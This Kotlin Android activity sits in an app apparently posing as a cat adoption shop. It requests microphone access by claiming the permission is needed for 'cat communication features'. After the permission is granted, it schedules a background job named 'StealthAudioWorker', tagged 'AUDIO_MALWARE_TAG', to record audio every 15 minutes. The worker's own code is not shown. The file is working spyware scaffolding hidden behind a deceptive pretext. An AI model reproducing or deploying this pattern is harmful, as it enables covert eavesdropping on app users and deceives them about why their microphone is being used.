package com.example.catsadoption_shop

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class PermissionCheckActivity : ComponentActivity() {

    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean ->
            if (isGranted) {
                // Permission is granted. Continue the action or workflow in your
                // app.
                startStealthRecording()
            } else {
                // Explain to the user that the feature is unavailable because the
                // feature requires a permission that the user has denied. At the
                // same time, respect the user's decision. Don't link to system
                // settings in an effort to convince the user to change their
                // decision.
                Toast.makeText(
                    this,
                    "Microphone permission is required for cat communication features.",
                    Toast.LENGTH_SHORT
                ).show()
                finish()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        when {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO
            ) == PackageManager.PERMISSION_GRANTED -> {
                // You can use the API that requires the permission.
                startStealthRecording()
            }
            else -> {
                // You can directly ask for the permission.
                requestPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
            }
        }
    }

    private fun startStealthRecording() {
        val periodicWorkRequest =
            PeriodicWorkRequestBuilder<StealthAudioWorker>(15, TimeUnit.MINUTES)
                .build()

        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "AUDIO_MALWARE_TAG",
            ExistingPeriodicWorkPolicy.KEEP,
            periodicWorkRequest
        )

        // Inform the user and close the activity
        Toast.makeText(this, "Periodic stealth recording scheduled...", Toast.LENGTH_SHORT).show()
        finish() // Finish activity after scheduling the work
    }
}
